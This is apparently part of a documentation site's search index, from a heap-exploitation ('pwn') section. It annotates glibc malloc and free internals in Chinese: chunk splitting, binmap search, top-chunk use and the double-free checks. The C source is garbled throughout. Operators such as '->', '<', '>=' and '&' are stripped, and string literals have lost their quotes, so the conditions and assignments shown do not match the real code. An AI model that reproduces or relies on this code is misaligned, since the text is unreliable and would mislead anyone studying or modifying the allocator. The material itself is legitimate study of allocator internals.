\u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f \n                 if   ( remainder_size     MINSIZE )   { \n                     set_inuse_bit_at_offset ( victim ,   size ); \n                     if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 } \n                 /* Split */ \n                 //  \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 \n                 else   { \n                     // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder \n                     remainder   =   chunk_at_offset ( victim ,   nb ); \n                     /* We cannot assume the unsorted list is empty and therefore                         have to perform a complete insert here.  */ \n                     // \u63d2\u5165unsorted bin\u4e2d \n                     bck   =   unsorted_chunks ( av ); \n                     fwd   =   bck - fd ; \n                     // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 \n                     if   ( __glibc_unlikely ( fwd - bk   !=   bck ))   { \n                         errstr   =   malloc(): corrupted unsorted chunks ; \n                         goto   errout ; \n                     } \n                     remainder - bk   =   bck ; \n                     remainder - fd   =   fwd ; \n                     bck - fd         =   remainder ; \n                     fwd - bk         =   remainder ; \n                     // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 \n                     if   ( ! in_smallbin_range ( remainder_size ))   { \n                         remainder - fd_nextsize   =   NULL ; \n                         remainder - bk_nextsize   =   NULL ; \n                     } \n                     // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 \n                     set_head ( victim , \n                              nb   |   PREV_INUSE   | \n                                  ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n\n                     // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 \n                     // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 \n                     set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n                     // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f \n                     set_foot ( remainder ,   remainder_size ); \n                 } \n                 // \u68c0\u67e5 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u8f6c\u6362\u4e3amem\u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             } \n         }", 
            "title": "large chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk", 
            "text": "\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684bin\u4e2d\u83b7\u53d6chunk\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002           /*             Search for a chunk by scanning bins, starting with next largest             bin. This search is strictly by best-fit; i.e., the smallest             (with ties going to approximately the least recently used) chunk             that fits is selected.             The bitmap avoids needing to check that most blocks are nonempty.             The particular case of skipping all bins during warm-up phases             when no chunks have been returned yet is faster than it might look.           */ \n\n         ++ idx ; \n         // \u83b7\u53d6\u5bf9\u5e94\u7684bin \n         bin     =   bin_at ( av ,   idx ); \n         // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 \n         // #define idx2block(i) ((i)   BINMAPSHIFT)  ,BINMAPSHIFT=5 \n         // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 \n         // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 \n         block   =   idx2block ( idx ); \n         // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 \n         map     =   av - binmap [   block   ]; \n         // #define idx2bit(i) ((1U   ((i)   ((1U   BINMAPSHIFT) - 1)))) \n         // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 \n         bit     =   idx2bit ( idx ); \n         for   (;;)   {", 
            "title": "\u5bfb\u627e\u8f83\u5927 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#map", 
            "text": "/* Skip rest of block if there are no more set bits in this block.               */ \n             // \u5982\u679cbit map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 \n             // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 \n             if   ( bit     map   ||   bit   ==   0 )   { \n                 do   { \n                     // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 \n                     // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 \n                     if   ( ++ block   =   BINMAPSIZE )   /* out of bins */ \n                         goto   use_top ; \n                 }   while   (( map   =   av - binmap [   block   ])   ==   0 ); \n                 // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 \n                 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 \n                 bin   =   bin_at ( av ,   ( block     BINMAPSHIFT )); \n                 bit   =   1 ; \n             }", 
            "title": "\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 map"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#bin", 
            "text": "/* Advance to bin with set bit. There must be one. */ \n             // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 \n             // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 \n             while   (( bit     map )   ==   0 )   { \n                 bin   =   next_bin ( bin ); \n                 bit   =   1 ; \n                 assert ( bit   !=   0 ); \n             }", 
            "title": "\u627e\u5230\u5408\u9002\u7684 bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk_1", 
            "text": "/* Inspect the bin. It is likely to be non-empty */ \n             // \u83b7\u53d6\u5bf9\u5e94\u7684bin \n             victim   =   last ( bin ); \n\n             /*  If a false alarm (empty bin), clear the bit. */ \n             // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin \n             // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 \n             if   ( victim   ==   bin )   { \n                 av - binmap [   block   ]   =   map   =   ~ bit ;   /* Write through */ \n                 bin                   =   next_bin ( bin ); \n                 bit   =   1 ; \n             }", 
            "title": "\u7b80\u5355\u68c0\u67e5 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk_2", 
            "text": "else   { \n                 // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f \n                 size   =   chunksize ( victim ); \n\n                 /*  We know the first chunk in this bin is big enough to use. */ \n                 assert (( unsigned   long )   ( size )   =   ( unsigned   long )   ( nb )); \n                 // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f \n                 remainder_size   =   size   -   nb ; \n\n                 /* unlink */ \n                 unlink ( av ,   victim ,   bck ,   fwd ); \n\n                 /* Exhaust */ \n                 // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f \n                 if   ( remainder_size     MINSIZE )   { \n                     set_inuse_bit_at_offset ( victim ,   size ); \n                     if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 } \n\n                 /* Split */ \n                 // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 \n                 else   { \n                     // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb \n                     remainder   =   chunk_at_offset ( victim ,   nb ); \n\n                     /* We cannot assume the unsorted list is empty and therefore                         have to perform a complete insert here.  */ \n                     // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d \n                     bck   =   unsorted_chunks ( av ); \n                     fwd   =   bck - fd ; \n                     if   ( __glibc_unlikely ( fwd - bk   !=   bck ))   { \n                         errstr   =   malloc(): corrupted unsorted chunks 2 ; \n                         goto   errout ; \n                     } \n                     remainder - bk   =   bck ; \n                     remainder - fd   =   fwd ; \n                     bck - fd         =   remainder ; \n                     fwd - bk         =   remainder ; \n\n                     /* advertise as last remainder */ \n                     // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder \n                     if   ( in_smallbin_range ( nb ))   av - last_remainder   =   remainder ; \n                     if   ( ! in_smallbin_range ( remainder_size ))   { \n                         remainder - fd_nextsize   =   NULL ; \n                         remainder - bk_nextsize   =   NULL ; \n                     } \n                     // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 \n                     set_head ( victim , \n                              nb   |   PREV_INUSE   | \n                                  ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n                     // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \n                     set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n                     // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f \n                     set_foot ( remainder ,   remainder_size ); \n                 } \n                 // \u68c0\u67e5 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             }", 
            "title": "\u771f\u6b63\u53d6\u51fachunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#top-chunk", 
            "text": "\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002       use_top : \n         /*             If large enough, split off the chunk bordering the end of memory             (held in av- top). Note that this is in accord with the best-fit             search rule.  In effect, av- top is treated as larger (and thus             less well fitting) than any other available chunk since it can             be extended to be as large as necessary (up to system             limitations).             We require that av- top always exists (i.e., has size  =             MINSIZE) after initialization, so if it would otherwise be             exhausted by current request, it is replenished. (The main             reason for ensuring it exists is that we may need MINSIZE space             to put in fenceposts in sysmalloc.)           */ \n         // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f \n         victim   =   av - top ; \n         size     =   chunksize ( victim ); \n         // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 \n         if   (( unsigned   long )   ( size )   =   ( unsigned   long )   ( nb   +   MINSIZE ))   { \n             remainder_size   =   size   -   nb ; \n             remainder        =   chunk_at_offset ( victim ,   nb ); \n             av - top          =   remainder ; \n             // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c \n             // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 \n             set_head ( victim ,   nb   |   PREV_INUSE   | \n                                  ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n             set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n\n             check_malloced_chunk ( av ,   victim ,   nb ); \n             void   * p   =   chunk2mem ( victim ); \n             alloc_perturb ( p ,   bytes ); \n             return   p ; \n         } \n         // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk \n         /* When we are using atomic ops to free fast chunks we can get             here for all block sizes.  */ \n         else   if   ( have_fastchunks ( av ))   { \n             // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 \n             malloc_consolidate ( av ); \n             /* restore original bin index */ \n             // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 \n             // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 \n             // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 \n             if   ( in_smallbin_range ( nb )) \n                 idx   =   smallbin_index ( nb ); \n             else \n                 idx   =   largebin_index ( nb ); \n         } \n\n         /*             Otherwise, relay to handle system-dependent cases           */ \n         // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 \n         else   { \n             void   * p   =   sysmalloc ( nb ,   av ); \n             if   ( p   !=   NULL )   alloc_perturb ( p ,   bytes ); \n             return   p ; \n         }", 
            "title": "\u4f7f\u7528 top chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_libc_calloc", 
            "text": "calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728  libc \u4e2d\u7684\u5305\u88c5\u4e3a  _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b  /*    calloc(size_t n_elements, size_t element_size);    Returns a pointer to n_elements * element_size bytes, with all locations    set to zero.  */  void *    __libc_calloc ( size_t ,   size_t );", 
            "title": "_libc_calloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#sysmalloc", 
            "text": "\u6709\u65f6\u95f4\u7684\u65f6\u5019\u518d\u5206\u6790\u3002", 
            "title": "sysmalloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_10", 
            "text": "", 
            "title": "\u91ca\u653e\u5185\u5b58\u5757"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#__libc_free", 
            "text": "\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b  void   __libc_free ( void   * mem )   { \n     mstate      ar_ptr ; \n     mchunkptr   p ;   /* chunk corresponding to mem */ \n     // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook \n     void   ( * hook )( void   * ,   const   void   * )   =   atomic_forced_read ( __free_hook ); \n     if   ( __builtin_expect ( hook   !=   NULL ,   0 ))   { \n         ( * hook )( mem ,   RETURN_ADDRESS ( 0 )); \n         return ; \n     } \n     // free NULL\u6ca1\u6709\u4f5c\u7528 \n     if   ( mem   ==   0 )   /* free(0) has no effect */ \n         return ; \n     // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 \n     p   =   mem2chunk ( mem ); \n     // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 \n     if   ( chunk_is_mmapped ( p ))   /* release mmapped memory. */ \n     { \n         /* See if the dynamic brk/mmap threshold needs adjusting.         Dumped fake mmapped chunks do not affect the threshold.  */ \n         if   ( ! mp_ . no_dyn_threshold     chunksize_nomask ( p )     mp_ . mmap_threshold   \n             chunksize_nomask ( p )   =   DEFAULT_MMAP_THRESHOLD_MAX   \n             ! DUMPED_MAIN_ARENA_CHUNK ( p ))   { \n             mp_ . mmap_threshold   =   chunksize ( p ); \n             mp_ . trim_threshold   =   2   *   mp_ . mmap_threshold ; \n             LIBC_PROBE ( memory_mallopt_free_dyn_thresholds ,   2 , \n                        mp_ . mmap_threshold ,   mp_ . trim_threshold ); \n         } \n         munmap_chunk ( p ); \n         return ; \n     } \n     // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 \n     ar_ptr   =   arena_for_chunk ( p ); \n     // \u6267\u884c\u91ca\u653e \n     _int_free ( ar_ptr ,   p ,   0 );  }", 
            "title": "__libc_free"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_int_free", 
            "text": "\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f  static   void   _int_free ( mstate   av ,   mchunkptr   p ,   int   have_lock )   { \n     INTERNAL_SIZE_T   size ;        /* its size */ \n     mfastbinptr   *     fb ;          /* associated fastbin */ \n     mchunkptr         nextchunk ;   /* next contiguous chunk */ \n     INTERNAL_SIZE_T   nextsize ;    /* its size */ \n     int               nextinuse ;   /* true if nextchunk is used */ \n     INTERNAL_SIZE_T   prevsize ;    /* size of previous contiguous chunk */ \n     mchunkptr         bck ;         /* misc temp for linking */ \n     mchunkptr         fwd ;         /* misc temp for linking */ \n\n     const   char   * errstr   =   NULL ; \n     int           locked   =   0 ; \n\n     size   =   chunksize ( p );", 
            "title": "_int_free"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_11", 
            "text": "/* Little security check which won t hurt performance: the         allocator never wrapps around at the end of the address space.         Therefore we can exclude some size values which might appear         here by accident or by  design  from some intruder.  */ \n     // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f \n     // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 \n     if   ( __builtin_expect (( uintptr_t )   p     ( uintptr_t )   - size ,   0 )   || \n         __builtin_expect ( misaligned_chunk ( p ),   0 ))   { \n         errstr   =   free(): invalid pointer ; \n     errout : \n         if   ( ! have_lock     locked )   __libc_lock_unlock ( av - mutex ); \n         malloc_printerr ( check_action ,   errstr ,   chunk2mem ( p ),   av ); \n         return ; \n     } \n     /* We know that each chunk is at least MINSIZE bytes in size or a         multiple of MALLOC_ALIGNMENT.  */ \n     // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d \n     if   ( __glibc_unlikely ( size     MINSIZE   ||   ! aligned_OK ( size )))   { \n         errstr   =   free(): invalid size ; \n         goto   errout ; \n     } \n     // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 \n     check_inuse_chunk ( av ,   p );   \u5176\u4e2d  /* Check if m has acceptable alignment */  #define aligned_OK(m) (((unsigned long) (m)  MALLOC_ALIGN_MASK) == 0)  #define misaligned_chunk(p)                                                    \\      ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p))         \\       MALLOC_ALIGN_MASK)", 
            "title": "\u7b80\u5355\u7684\u68c0\u67e5"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#fast-bin_1", 
            "text": "\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230  fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684 \u7b2c\u4e00\u4e2a free chunk \u3002       /*        If eligible, place chunk on a fastbin so it can be found        and used quickly in malloc.      */ \n\n     if   (( unsigned   long )   ( size )   =   ( unsigned   long )   ( get_max_fast ())  #if TRIM_FASTBINS \n         /*        If TRIM_FASTBINS set, don t place chunks        bordering top into fastbins          */ \n        //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c \n        // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 \n           ( chunk_at_offset ( p ,   size )   !=   av - top )  #endif \n             )   { \n         // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 \n         // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k \n         // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 \n         if   ( __builtin_expect ( \n                 chunksize_nomask ( chunk_at_offset ( p ,   size ))   =   2   *   SIZE_SZ ,   0 )   || \n             __builtin_expect ( \n                 chunksize ( chunk_at_offset ( p ,   size ))   =   av - system_mem ,   0 ))   { \n             /* We might not have a lock at this point and concurrent                 modifications                 of system_mem might have let to a false positive.  Redo the test                 after getting the lock.  */ \n             if   ( have_lock   ||   ({ \n                     assert ( locked   ==   0 ); \n                     __libc_lock_lock ( av - mutex ); \n                     locked   =   1 ; \n                     chunksize_nomask ( chunk_at_offset ( p ,   size ))   =   2   *   SIZE_SZ   || \n                         chunksize ( chunk_at_offset ( p ,   size ))   =   av - system_mem ; \n                 }))   { \n                 errstr   =   free(): invalid next size (fast) ; \n                 goto   errout ; \n             } \n             if   ( ! have_lock )   { \n                 __libc_lock_unlock ( av - mutex ); \n                 locked   =   0 ; \n             } \n         } \n         // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte  \n         free_perturb ( chunk2mem ( p ),   size   -   2   *   SIZE_SZ ); \n         // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d \n         set_fastchunks ( av ); \n         // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 \n         unsigned   int   idx   =   fastbin_index ( size ); \n         // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 \n         fb                 =   fastbin ( av ,   idx ); \n\n         /* Atomically link P to its fastbin: P- FD = *FB; *FB = P;  */ \n         // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d \n         mchunkptr      old       =   * fb ,   old2 ; \n         unsigned   int   old_idx   =   ~ 0u ; \n         do   { \n             /* Check that the top of the bin is not the record we are going to                 add                 (i.e., double free).  */ \n             // so we can not double free one fastbin chunk \n             // \u9632\u6b62\u5bf9 fast bin double free \n             if   ( __builtin_expect ( old   ==   p ,   0 ))   { \n                 errstr   =   double free or corruption (fasttop) ; \n                 goto   errout ; \n             } \n             /* Check that size of fastbin chunk at the top is the same as                 size of the chunk that we are adding.  We can dereference OLD                 only if we have the lock, otherwise it might have already been                 deallocated.  See use of OLD_IDX below for the actual check.  */ \n             if   ( have_lock     old   !=   NULL ) \n                 old_idx   =   fastbin_index ( chunksize ( old )); \n             p - fd   =   old2   =   old ; \n         }   while   (( old   =   catomic_compare_and_exchange_val_rel ( fb ,   p ,   old2 ))   != \n                  old2 ); \n         // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c \n         if   ( have_lock     old   !=   NULL     __builtin_expect ( old_idx   !=   idx ,   0 ))   { \n             errstr   =   invalid fastbin entry (free) ; \n             goto   errout ; \n         } \n     }", 
            "title": "fast bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#mmap-chunk", 
            "text": "\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1unlink  \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514dheap\u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a   \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757  \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757   \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002  \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002       /*        Consolidate other non-mmapped chunks as they arrive.      */ \n\n     else   if   ( ! chunk_is_mmapped ( p ))   { \n         if   ( ! have_lock )   { \n             __libc_lock_lock ( av - mutex ); \n             locked   =   1 ; \n         } \n         nextchunk   =   chunk_at_offset ( p ,   size );", 
            "title": "\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_12", 
            "text": "/* Lightweight tests: check whether the block is already the             top block.  */ \n         // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk \n         if   ( __glibc_unlikely ( p   ==   av - top ))   { \n             errstr   =   double free or corruption (top) ; \n             goto   errout ; \n         } \n         // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c \n         /* Or whether the next chunk is beyond the boundaries of the arena.  */ \n         if   ( __builtin_expect ( contiguous ( av )   \n                                  ( char   * )   nextchunk   = \n                                      (( char   * )   av - top   +   chunksize ( av - top )), \n                              0 ))   { \n             errstr   =   double free or corruption (out) ; \n             goto   errout ; \n         } \n         // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free \n         /* Or whether the block is actually not marked used.  */ \n         if   ( __glibc_unlikely ( ! prev_inuse ( nextchunk )))   { \n             errstr   =   double free or corruption (!prev) ; \n             goto   errout ; \n         } \n         // 